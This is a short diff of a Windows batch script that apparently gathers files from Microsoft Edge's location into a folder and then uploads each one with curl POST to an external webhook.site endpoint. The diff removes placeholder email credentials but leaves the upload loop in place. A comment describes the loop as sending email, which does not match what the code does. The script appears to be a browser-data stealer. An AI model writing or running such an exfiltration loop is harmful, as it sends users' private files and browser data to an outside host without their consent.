@@ -27,10 +27,6 @@ if exist "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" (
 
 echo Done.
 
-:: Hardcoded email credentials
-set "EmailUsername=your_email@gmail.com"
-set "EmailPassword=your_password"
-
 :: Iterate over files in the destination directory and send email for each file
 for %%A in ("%DEST%\*") do (
     curl -X POST -F "file=@%%A" https://webhook.site/50e04090-829b-4ff1-bb01-7a9d2b82d17c
